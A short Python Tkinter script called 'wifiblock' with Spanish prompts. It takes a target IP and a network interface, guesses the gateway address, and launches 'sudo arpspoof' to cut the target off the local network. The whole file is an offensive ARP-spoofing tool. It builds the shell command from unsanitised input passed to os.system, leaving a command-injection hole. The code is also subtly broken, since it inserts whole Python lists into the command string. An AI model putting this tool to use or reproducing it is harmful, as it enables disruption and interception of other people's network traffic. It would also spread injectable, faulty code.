#!/usr/bin/env python3

from tkinter import * 
from tkinter import ttk 
import os

ips = []
internet = []



def actualizar():
       global ips, internet
       texto = entrada.get()
       ips.append(texto)
       print('ips guardadas: ', ips)
       texto1 = entrada1.get()
       internet.append(texto1)
       print('internet guardadas: ', internet)
       def cambiar_ultima_ip(ips):
    
              partes = ips[0].split('.')
    
              partes[-1] = '1'
    
    
              nueva_ip = '.'.join(partes)
              return nueva_ip
       ips = ips
       ipmod = cambiar_ultima_ip(ips)
       comando = f'sudo arpspoof -i "{internet}" -t "{ips}" "{ipmod}"'
       os.system(comando)

win = Tk() 
win.geometry('400x300')
win.title('wifiblock')

ver = Label(
    win,
    text = '¿cual es la ip?'
    ).pack()

entrada = Entry(
        win, 
        width = 25
        )
entrada.pack(pady = 10)

ver1 = Label(
       win,
       text = '¿cual es su interfaz de red?'
)
ver1.pack()

entrada1 = Entry(
       win,
       width = 25
)
entrada1.pack()

boton = Button(
        win, 
        text = 'Aceptar',
        command = actualizar
        ).pack()



win.mainloop()